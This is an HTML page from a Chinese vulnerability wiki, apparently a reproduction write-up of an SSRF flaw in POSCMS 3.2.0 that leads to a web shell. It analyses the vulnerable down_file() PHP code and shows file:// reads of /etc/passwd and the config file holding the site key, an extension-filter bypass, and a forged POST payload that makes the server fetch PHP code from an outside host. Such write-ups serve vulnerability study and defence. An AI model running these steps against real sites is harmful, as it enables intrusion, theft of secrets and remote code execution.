@@ -1,0 +1,258 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+  
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    <meta name="author" content="内部使用">
+    <link rel="canonical" href="https://secnn.com/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/POSCMS/POSCMS%203.2.0%20ssrf%E6%BC%8F%E6%B4%9Egetshell/">
+    <link rel="shortcut icon" href="../../../favicon.ico">
+    
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
+    <title>POSCMS 3.2.0 ssrf漏洞getshell - SecNN-Wiki漏洞库管理系统&网络安全知识库-本Wiki所有信息来源于公开漏洞数据库</title>
+    <link href="../../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
+    <link href="../../../css/font-awesome-4.7.0.css" rel="stylesheet">
+    <link href="../../../css/base.css" rel="stylesheet">
+    <link rel="stylesheet" href="../../../css/highlight.css">
+    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!--[if lt IE 9]>
+        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
+    <![endif]-->
+
+    <script src="../../../js/jquery-3.2.1.min.js"></script>
+    <script src="../../../js/bootstrap-3.3.7.min.js"></script>
+    <script src="../../../js/highlight.pack.js"></script>
+    
+    <base target="_top">
+    <script>
+      var base_url = '../../..';
+      var is_top_frame = false;
+        
+        var pageToc = [
+          {title: "POSCMS 3.2.0 ssrf\u6f0f\u6d1egetshell", url: "#_top", children: [
+              {title: "\u4e00\u3001\u6f0f\u6d1e\u7b80\u4ecb", url: "#_1" },
+              {title: "\u4e8c\u3001\u6f0f\u6d1e\u5f71\u54cd", url: "#_2" },
+              {title: "\u4e09\u3001\u590d\u73b0\u8fc7\u7a0b", url: "#_3" },
+              {title: "\u53c2\u8003\u94fe\u63a5", url: "#_6" },
+          ]},
+        ];
+
+    </script>
+    <script src="../../../js/base.js"></script>
+      <script src="../../../search/main.js"></script> 
+</head>
+
+<body>
+<script>
+if (is_top_frame) { $('body').addClass('wm-top-page'); }
+</script>
+
+
+
+<div class="container-fluid wm-page-content">
+  <a name="_top"></a>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../POSCMS%203.2.0%20%E5%89%8D%E5%8F%B0sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../POSCMS%203.2.0%20%E5%89%8D%E5%8F%B0sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
+        POSCMS 3.2.0 前台sql注入漏洞
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../../PHPUnit/CVE-2017-9841/README.zh-cn/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../../PHPUnit/CVE-2017-9841/README.zh-cn/" class="btn btn-xs btn-link">
+        phpunit 远程代码执行漏洞（CVE-2017-9841）
+      </a>
+    </div>
+    
+  </div>
+
+    
+
+    <h1 id="poscms-320-ssrfgetshell">POSCMS 3.2.0 ssrf漏洞getshell<a class="headerlink" href="#poscms-320-ssrfgetshell" title="Permanent link">&para;</a></h1>
+<h2 id="_1">一、漏洞简介<a class="headerlink" href="#_1" title="Permanent link">&para;</a></h2>
+<h2 id="_2">二、漏洞影响<a class="headerlink" href="#_2" title="Permanent link">&para;</a></h2>
+<p>POSCMS 3.2.0</p>
+<h2 id="_3">三、复现过程<a class="headerlink" href="#_3" title="Permanent link">&para;</a></h2>
+<p>打开项目源代码，第一个漏洞的出处在<code>\diy\module\member\controllers\Api.php</code>中的<code>down_file()</code>函数，内容如下：</p>
+<div class="codehilite"><pre><span></span><code><span class="o">//</span><span class="w"> </span><span class="err">文件下载并上传</span>
+<span class="n">public</span><span class="w"> </span><span class="n">function</span><span class="w"> </span><span class="n">down_file</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
+
+<span class="w">    </span><span class="o">/***********************************************************</span>
+<span class="w">    </span><span class="o">*</span><span class="w"> </span><span class="n">Part0</span><span class="o">.</span><span class="w"> </span><span class="err">获取</span><span class="n">POST参数url中的内容并解析</span>
+<span class="w">    </span><span class="o">************************************************************/</span>
+<span class="w">    </span><span class="o">$</span><span class="n">p</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">array</span><span class="p">();</span>
+<span class="w">    </span><span class="o">$</span><span class="n">url</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">explode</span><span class="p">(</span><span class="s1">&#39;&amp;&#39;</span><span class="p">,</span><span class="w"> </span><span class="o">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">input</span><span class="o">-&gt;</span><span class="n">post</span><span class="p">(</span><span class="s1">&#39;url&#39;</span><span class="p">));</span>
+
+<span class="w">    </span><span class="n">foreach</span><span class="w"> </span><span class="p">(</span><span class="o">$</span><span class="n">url</span><span class="w"> </span><span class="k">as</span><span class="w"> </span><span class="o">$</span><span class="n">t</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="o">$</span><span class="n">item</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">explode</span><span class="p">(</span><span class="s1">&#39;=&#39;</span><span class="p">,</span><span class="w"> </span><span class="o">$</span><span class="n">t</span><span class="p">);</span>
+<span class="w">    </span><span class="o">$</span><span class="n">p</span><span class="p">[</span><span class="o">$</span><span class="n">item</span><span class="p">[</span><span class="mi">0</span><span class="p">]]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">$</span><span class="n">item</span><span class="p">[</span><span class="mi">1</span><span class="p">];</span>
+<span class="w">    </span><span class="p">}</span>
+
+<span class="w">    </span><span class="o">/***********************************************************</span>
+<span class="w">    </span><span class="o">*</span><span class="w"> </span><span class="n">Part1</span><span class="o">.</span><span class="w"> </span><span class="err">验证用户权限</span>
+<span class="w">    </span><span class="o">************************************************************/</span>
+<span class="w">    </span><span class="o">!$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">uid</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="n">exit</span><span class="p">(</span><span class="n">dr_json</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="n">fc_lang</span><span class="p">(</span><span class="s1">&#39;游客不允许上传附件&#39;</span><span class="p">)));</span>
+
+<span class="w">    </span><span class="o">//</span><span class="w"> </span><span class="err">会员组权限</span>
+<span class="w">    </span><span class="o">$</span><span class="n">member_rule</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">get_cache</span><span class="p">(</span><span class="s1">&#39;member&#39;</span><span class="p">,</span><span class="w"> </span><span class="s1">&#39;setting&#39;</span><span class="p">,</span><span class="w"> </span><span class="s1">&#39;permission&#39;</span><span class="p">,</span><span class="w"> </span><span class="o">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">member</span><span class="p">[</span><span class="s1">&#39;mark&#39;</span><span class="p">]);</span>
+
+<span class="w">    </span><span class="o">//</span><span class="w"> </span><span class="err">是否允许上传附件</span>
+<span class="w">    </span><span class="o">!$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">member</span><span class="p">[</span><span class="s1">&#39;adminid&#39;</span><span class="p">]</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="o">!$</span><span class="n">member_rule</span><span class="p">[</span><span class="s1">&#39;is_upload&#39;</span><span class="p">]</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="n">exit</span><span class="p">(</span><span class="n">dr_json</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="n">fc_lang</span><span class="p">(</span><span class="s1">&#39;您的会员组无权上传附件&#39;</span><span class="p">)));</span>
+
+<span class="w">    </span><span class="o">//</span><span class="w"> </span><span class="err">附件总大小判断</span>
+<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="o">!$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">member</span><span class="p">[</span><span class="s1">&#39;adminid&#39;</span><span class="p">]</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="o">$</span><span class="n">member_rule</span><span class="p">[</span><span class="s1">&#39;attachsize&#39;</span><span class="p">])</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="o">$</span><span class="n">data</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">db</span><span class="o">-&gt;</span><span class="n">select_sum</span><span class="p">(</span><span class="s1">&#39;filesize&#39;</span><span class="p">)</span><span class="o">-&gt;</span><span class="n">where</span><span class="p">(</span><span class="s1">&#39;uid&#39;</span><span class="p">,</span><span class="w"> </span><span class="o">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">uid</span><span class="p">)</span><span class="o">-&gt;</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;attachment&#39;</span><span class="p">)</span><span class="o">-&gt;</span><span class="n">row_array</span><span class="p">();</span>
+<span class="w">    </span><span class="o">$</span><span class="n">filesize</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="nb nb-Type">int</span><span class="p">)</span><span class="o">$</span><span class="n">data</span><span class="p">[</span><span class="s1">&#39;filesize&#39;</span><span class="p">];</span>
+<span class="w">    </span><span class="o">$</span><span class="n">filesize</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="o">$</span><span class="n">member_rule</span><span class="p">[</span><span class="s1">&#39;attachsize&#39;</span><span class="p">]</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="mi">1024</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="mi">1024</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="n">exit</span><span class="p">(</span><span class="n">dr_json</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="n">fc_lang</span><span class="p">(</span><span class="s1">&#39;附件空间不足！您的附件总空间</span><span class="si">%s</span><span class="s1">，现有附件</span><span class="si">%s</span><span class="s1">。&#39;</span><span class="p">,</span><span class="w"> </span><span class="o">$</span><span class="n">member_rule</span><span class="p">[</span><span class="s1">&#39;attachsize&#39;</span><span class="p">]</span><span class="o">.</span><span class="s1">&#39;MB&#39;</span><span class="p">,</span><span class="w"> </span><span class="n">dr_format_file_size</span><span class="p">(</span><span class="o">$</span><span class="n">filesize</span><span class="p">))));</span>
+<span class="w">    </span><span class="p">}</span>
+
+<span class="w">    </span><span class="o">/***********************************************************</span>
+<span class="w">    </span><span class="o">*</span><span class="w"> </span><span class="n">Part2</span><span class="o">.</span><span class="w"> </span><span class="err">解密</span><span class="n">code参数的值获得扩展</span><span class="err">、路径等信息</span>
+<span class="w">    </span><span class="o">************************************************************/</span><span class="w">    </span>
+<span class="w">    </span><span class="n">list</span><span class="p">(</span><span class="o">$</span><span class="n">size</span><span class="p">,</span><span class="w"> </span><span class="o">$</span><span class="n">ext</span><span class="p">,</span><span class="w"> </span><span class="o">$</span><span class="n">path</span><span class="p">)</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">explode</span><span class="p">(</span><span class="s1">&#39;|&#39;</span><span class="p">,</span><span class="w"> </span><span class="n">dr_authcode</span><span class="p">(</span><span class="o">$</span><span class="n">p</span><span class="p">[</span><span class="s1">&#39;code&#39;</span><span class="p">],</span><span class="w"> </span><span class="s1">&#39;DECODE&#39;</span><span class="p">));</span>
+
+<span class="w">    </span><span class="o">/***********************************************************</span>
+<span class="w">    </span><span class="o">*</span><span class="w"> </span><span class="n">Part3</span><span class="o">.</span><span class="w"> </span><span class="err">生成存放路径</span>
+<span class="w">    </span><span class="o">************************************************************/</span><span class="w">    </span>
+<span class="w">    </span><span class="o">$</span><span class="n">path</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">$</span><span class="n">path</span><span class="w"> </span><span class="err">?</span><span class="w"> </span><span class="n">SYS_UPLOAD_PATH</span><span class="o">.</span><span class="s1">&#39;/&#39;</span><span class="o">.$</span><span class="n">path</span><span class="o">.</span><span class="s1">&#39;/&#39;</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="n">SYS_UPLOAD_PATH</span><span class="o">.</span><span class="s1">&#39;/&#39;</span><span class="o">.</span><span class="n">date</span><span class="p">(</span><span class="s1">&#39;Ym&#39;</span><span class="p">,</span><span class="w"> </span><span class="n">SYS_TIME</span><span class="p">)</span><span class="o">.</span><span class="s1">&#39;/&#39;</span><span class="p">;</span>
+<span class="w">    </span><span class="o">!</span><span class="n">is_dir</span><span class="p">(</span><span class="o">$</span><span class="n">path</span><span class="p">)</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="n">dr_mkdirs</span><span class="p">(</span><span class="o">$</span><span class="n">path</span><span class="p">);</span>
+
+<span class="w">    </span><span class="o">$</span><span class="n">furl</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">input</span><span class="o">-&gt;</span><span class="n">post</span><span class="p">(</span><span class="s1">&#39;file&#39;</span><span class="p">);</span>
+
+<span class="w">    </span><span class="o">/***********************************************************</span>
+<span class="w">    </span><span class="o">*</span><span class="w"> </span><span class="n">Part4</span><span class="o">.</span><span class="w"> </span><span class="err">访问并获取文件</span><span class="w">  </span>
+<span class="w">    </span><span class="o">************************************************************/</span>
+<span class="w">    </span><span class="o">$</span><span class="n">file</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">dr_catcher_data</span><span class="p">(</span><span class="o">$</span><span class="n">furl</span><span class="p">);</span>
+<span class="w">    </span><span class="o">!$</span><span class="n">file</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="n">exit</span><span class="p">(</span><span class="n">dr_json</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="s1">&#39;获取远程文件失败&#39;</span><span class="p">));</span>
+
+<span class="w">    </span><span class="o">/***********************************************************</span>
+<span class="w">    </span><span class="o">*</span><span class="w"> </span><span class="n">Part5</span><span class="o">.</span><span class="w"> </span><span class="err">根据扩展名过滤并存储数据</span><span class="w">  </span>
+<span class="w">    </span><span class="o">************************************************************/</span>
+<span class="w">    </span><span class="o">$</span><span class="n">fileext</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">strtolower</span><span class="p">(</span><span class="n">trim</span><span class="p">(</span><span class="n">substr</span><span class="p">(</span><span class="n">strrchr</span><span class="p">(</span><span class="o">$</span><span class="n">furl</span><span class="p">,</span><span class="w"> </span><span class="s1">&#39;.&#39;</span><span class="p">),</span><span class="w"> </span><span class="mi">1</span><span class="p">,</span><span class="w"> </span><span class="mi">10</span><span class="p">)));</span><span class="w"> </span><span class="o">//</span><span class="err">扩展名</span>
+<span class="w">    </span><span class="o">$</span><span class="n">exts</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">array</span><span class="p">)</span><span class="n">explode</span><span class="p">(</span><span class="s1">&#39;,&#39;</span><span class="p">,</span><span class="w"> </span><span class="o">$</span><span class="n">ext</span><span class="p">);</span>
+<span class="w">    </span><span class="o">!</span><span class="n">in_array</span><span class="p">(</span><span class="o">$</span><span class="n">fileext</span><span class="p">,</span><span class="w"> </span><span class="o">$</span><span class="n">exts</span><span class="p">)</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="n">exit</span><span class="p">(</span><span class="n">dr_json</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="s1">&#39;远程文件扩展名（&#39;</span><span class="o">.$</span><span class="n">fileext</span><span class="o">.</span><span class="s1">&#39;）不允许&#39;</span><span class="p">));</span>
+<span class="w">    </span><span class="o">$</span><span class="n">fileext</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="s1">&#39;php&#39;</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="n">exit</span><span class="p">(</span><span class="n">dr_json</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="s1">&#39;远程文件扩展名（&#39;</span><span class="o">.$</span><span class="n">fileext</span><span class="o">.</span><span class="s1">&#39;）不允许&#39;</span><span class="p">));</span>
+
+<span class="w">    </span><span class="o">$</span><span class="n">filename</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">substr</span><span class="p">(</span><span class="n">md5</span><span class="p">(</span><span class="n">time</span><span class="p">()),</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="mi">7</span><span class="p">)</span><span class="o">.</span><span class="n">rand</span><span class="p">(</span><span class="mi">100</span><span class="p">,</span><span class="w"> </span><span class="mi">999</span><span class="p">);</span><span class="w">       </span><span class="o">//</span><span class="err">文件名</span>
+
+<span class="w">    </span><span class="o">/***********************************************************</span>
+<span class="w">    </span><span class="o">*</span><span class="w"> </span><span class="n">Part6</span><span class="o">.</span><span class="w"> </span><span class="err">向路径写入数据并返回响应结果</span><span class="w">  </span>
+<span class="w">    </span><span class="o">************************************************************/</span>
+<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="err">@</span><span class="n">file_put_contents</span><span class="p">(</span><span class="o">$</span><span class="n">path</span><span class="o">.$</span><span class="n">filename</span><span class="o">.</span><span class="s1">&#39;.&#39;</span><span class="o">.$</span><span class="n">fileext</span><span class="p">,</span><span class="w"> </span><span class="o">$</span><span class="n">file</span><span class="p">))</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="o">$</span><span class="n">info</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">array</span><span class="p">(</span>
+<span class="w">            </span><span class="s1">&#39;file_ext&#39;</span><span class="w"> </span><span class="o">=&gt;</span><span class="w"> </span><span class="s1">&#39;.&#39;</span><span class="o">.$</span><span class="n">fileext</span><span class="p">,</span>
+<span class="w">            </span><span class="s1">&#39;full_path&#39;</span><span class="w"> </span><span class="o">=&gt;</span><span class="w"> </span><span class="o">$</span><span class="n">path</span><span class="o">.$</span><span class="n">filename</span><span class="o">.</span><span class="s1">&#39;.&#39;</span><span class="o">.$</span><span class="n">fileext</span><span class="p">,</span>
+<span class="w">            </span><span class="s1">&#39;file_size&#39;</span><span class="w"> </span><span class="o">=&gt;</span><span class="w"> </span><span class="n">filesize</span><span class="p">(</span><span class="o">$</span><span class="n">path</span><span class="o">.$</span><span class="n">filename</span><span class="o">.</span><span class="s1">&#39;.&#39;</span><span class="o">.$</span><span class="n">fileext</span><span class="p">)</span><span class="o">/</span><span class="mi">1024</span><span class="p">,</span>
+<span class="w">            </span><span class="s1">&#39;client_name&#39;</span><span class="w"> </span><span class="o">=&gt;</span><span class="w"> </span><span class="s1">&#39;&#39;</span><span class="p">,</span>
+<span class="w">        </span><span class="p">);</span>
+<span class="w">        </span><span class="o">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="nb">load</span><span class="o">-&gt;</span><span class="n">model</span><span class="p">(</span><span class="s1">&#39;attachment_model&#39;</span><span class="p">);</span>
+<span class="w">        </span><span class="o">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">attachment_model</span><span class="o">-&gt;</span><span class="n">siteid</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">$</span><span class="n">p</span><span class="p">[</span><span class="s1">&#39;siteid&#39;</span><span class="p">]</span><span class="w"> </span><span class="err">?</span><span class="w"> </span><span class="o">$</span><span class="n">p</span><span class="p">[</span><span class="s1">&#39;siteid&#39;</span><span class="p">]</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="n">SITE_ID</span><span class="p">;</span>
+<span class="w">        </span><span class="o">$</span><span class="n">result</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">attachment_model</span><span class="o">-&gt;</span><span class="n">upload</span><span class="p">(</span><span class="o">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">uid</span><span class="p">,</span><span class="w"> </span><span class="o">$</span><span class="n">info</span><span class="p">);</span>
+<span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">is_array</span><span class="p">(</span><span class="o">$</span><span class="n">result</span><span class="p">))</span><span class="w"> </span><span class="p">{</span>
+<span class="w">            </span><span class="n">list</span><span class="p">(</span><span class="o">$</span><span class="n">id</span><span class="p">)</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">$</span><span class="n">result</span><span class="p">;</span>
+<span class="w">            </span><span class="n">echo</span><span class="w"> </span><span class="n">json_encode</span><span class="p">(</span><span class="n">array</span><span class="p">(</span><span class="s1">&#39;status&#39;</span><span class="o">=&gt;</span><span class="mi">1</span><span class="p">,</span><span class="w"> </span><span class="s1">&#39;id&#39;</span><span class="o">=&gt;$</span><span class="n">id</span><span class="p">,</span><span class="w"> </span><span class="s1">&#39;name&#39;</span><span class="w"> </span><span class="o">=&gt;</span><span class="w"> </span><span class="n">dr_strcut</span><span class="p">(</span><span class="o">$</span><span class="n">filename</span><span class="p">,</span><span class="w"> </span><span class="mi">10</span><span class="p">)</span><span class="o">.</span><span class="s1">&#39;.&#39;</span><span class="o">.$</span><span class="n">fileext</span><span class="p">));</span><span class="n">exit</span><span class="p">;</span>
+<span class="w">        </span><span class="p">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="p">{</span>
+<span class="w">            </span><span class="err">@</span><span class="n">unlink</span><span class="p">(</span><span class="o">$</span><span class="n">info</span><span class="p">[</span><span class="s1">&#39;full_path&#39;</span><span class="p">]);</span>
+<span class="w">            </span><span class="n">exit</span><span class="p">(</span><span class="n">dr_json</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="o">$</span><span class="n">result</span><span class="p">));</span>
+<span class="w">        </span><span class="p">}</span>
+<span class="w">    </span><span class="p">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="n">exit</span><span class="p">(</span><span class="n">dr_json</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="s1">&#39;文件移动失败，目录无权限（&#39;</span><span class="o">.$</span><span class="n">path</span><span class="o">.</span><span class="s1">&#39;）&#39;</span><span class="p">));</span>
+<span class="w">    </span><span class="p">}</span>
+<span class="p">}</span>
+</code></pre></div>
+
+<h3 id="_4">源码分析<a class="headerlink" href="#_4" title="Permanent link">&para;</a></h3>
+<p>这段代码的主要逻辑是**根据请求中参数去请求文件内容，并将它保存在特定目录中，最后以json格式返回保存结果**。</p>
+<p>Part1没什么好说的，只要管理员不修改默认权限，注册个普通用户就有视频、图片的上传功能。Part2中<code>dr_authcode()</code>是一个加解密函数，位于<code>\diy\dayrui\helpers\function_helper.php</code>。其具体实现可以不用关心，毕竟源码已经到手，只要找到密钥，就能随意构造加密结果。</p>
+<p><img alt="1.png" src="../resource/POSCMS3.2.0ssrf%E6%BC%8F%E6%B4%9Egetshell/media/rId25.png" /></p>
+<p>Part3中确定了下载文件的名称，这里我们请求的参数中不包含<code>code</code>参数，使<code>$PATH为空</code>，则它会取问号表达式的后半段<code>SYS_UPLOAD_PATH.'/'.date('Ym', SYS_TIME).'/'</code>，最后的上传路径如下：<code>/uploadfile/年月/</code>。</p>
+<p><img alt="2.png" src="../resource/POSCMS3.2.0ssrf%E6%BC%8F%E6%B4%9Egetshell/media/rId26.png" /></p>
+<p>Part4中的<code>dr_catcher_data()</code>函数正是SSRF漏洞的来源，其实现位于<code>\diy\dayrui\helpers\function_helper.php</code>。无论代码最后选的是fopen模式还是curl模式，开发人员都没有对可解析的协议做限制，也没有校验请求参数<code>$url</code>的范围。</p>
+<p><img alt="3.png" src="../resource/POSCMS3.2.0ssrf%E6%BC%8F%E6%B4%9Egetshell/media/rId27.png" /></p>
+<h3 id="_5">寻找触发点<a class="headerlink" href="#_5" title="Permanent link">&para;</a></h3>
+<p>直接用VSCode的全局搜索功能，寻找<code>down_file()</code>函数的调用位置：</p>
+<p><img alt="4.png" src="../resource/POSCMS3.2.0ssrf%E6%BC%8F%E6%B4%9Egetshell/media/rId29.png" /></p>
+<p>发现它出现在了一个js文件中，于是构造一个XHR的POST请求到服务端，设置<code>file</code>参数的值使其访问<code>/etc/passwd</code>，得到如下响应：</p>
+<p><img alt="5.png" src="../resource/POSCMS3.2.0ssrf%E6%BC%8F%E6%B4%9Egetshell/media/rId30.png" /></p>
+<p>用浏览器打开"文件存储路径+返回的文件名"：</p>
+<p><img alt="6.png" src="../resource/POSCMS3.2.0ssrf%E6%BC%8F%E6%B4%9Egetshell/media/rId31.png" /></p>
+<h3 id="getshell">GetShell<a class="headerlink" href="#getshell" title="Permanent link">&para;</a></h3>
+<p>再请求一下<code>/config/system.php</code>，该文件中存储有重要的元数据。</p>
+<p><img alt="7.png" src="../resource/POSCMS3.2.0ssrf%E6%BC%8F%E6%B4%9Egetshell/media/rId33.png" /></p>
+<p>这是因为Part5中的<code>$ext</code>变量虽然为空，但它专门过滤了.php文件，好在利用<code>file://</code>协议的解析特性，可以绕过这一点，比如<code>.php?.</code>或<code>.php#.</code>：</p>
+<p><img alt="8.png" src="../resource/POSCMS3.2.0ssrf%E6%BC%8F%E6%B4%9Egetshell/media/rId34.png" /></p>
+<p>再次用浏览器打开并设置编码格式为UTF-8：</p>
+<p><img alt="9.png" src="../resource/POSCMS3.2.0ssrf%E6%BC%8F%E6%B4%9Egetshell/media/rId35.png" /></p>
+<p>获取到安全密钥后，可以构造特殊payload绕过扩展名检查。这里，总结一下此次GetShell的思路：</p>
+<ol>
+<li>构造特殊payload使.html文件允许被上传</li>
+<li>在自己控制的服务器上放置.html文件（里面有恶意代码的php代码）</li>
+<li>利用SSRF漏洞，使服务器用http协议访问带外数据（OOB），获取到恶意的.html，形成Getshell</li>
+</ol>
+<p>为了绕过扩展名检查，我将加密代码拷贝进另一文件并填入密钥，输入选择<code>1|html,|0</code>，运行得到输出为<code>22d7Qrdws88/R/uETpWlvY/PFNTYzvs/QNj5PBa66veNDlECqpM</code>，并构造POST参数<code>file=http://www.0-sec.org/haha.html&amp;url=code=22d7Qrdws88/R/uETpWlvY/PFNTYzvs/QNj5PBa66veNDlECqpM</code>，这里的<code>haha.html</code>里包含了php代码<code>&lt;?php echo phpinfo();?&gt;</code>，最终效果如下：</p>
+<p><img alt="10.png" src="../resource/POSCMS3.2.0ssrf%E6%BC%8F%E6%B4%9Egetshell/media/rId36.png" /></p>
+<p><img alt="11.png" src="../resource/POSCMS3.2.0ssrf%E6%BC%8F%E6%B4%9Egetshell/media/rId37.png" /></p>
+<p>如果这里复现失败了，那大概是在于两点：一、加密函数有时效性，过时需要重新生成；二、CentOS默认安装的Apache无法解析包含php代码的html文件，需要在<code>/etc/httpd/conf.d/php.conf</code>中添加如下：</p>
+<p><img alt="12.png" src="../resource/POSCMS3.2.0ssrf%E6%BC%8F%E6%B4%9Egetshell/media/rId38.png" /></p>
+<h2 id="_6">参考链接<a class="headerlink" href="#_6" title="Permanent link">&para;</a></h2>
+<blockquote>
+<p><a href="https://xz.aliyun.com/t/4858">https://xz.aliyun.com/t/4858</a>#toc-1</p>
+</blockquote>
+
+  <br>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../POSCMS%203.2.0%20%E5%89%8D%E5%8F%B0sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../POSCMS%203.2.0%20%E5%89%8D%E5%8F%B0sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
+        POSCMS 3.2.0 前台sql注入漏洞
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../../PHPUnit/CVE-2017-9841/README.zh-cn/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../../PHPUnit/CVE-2017-9841/README.zh-cn/" class="btn btn-xs btn-link">
+        phpunit 远程代码执行漏洞（CVE-2017-9841）
+      </a>
+    </div>
+    
+  </div>
+
+    <br>
+</div>
+
+<footer class="col-md-12 wm-page-content"><p>Copyright © 2025 SecNN-Wiki</p>
+  <p>Documentation built with <a href="http://www.mkdocs.org/">MkDocs</a> using <a href="None">Windmill Dark</a> theme by 内部使用 (noraj).</p>
+</footer>
+
+</body>
+</html>
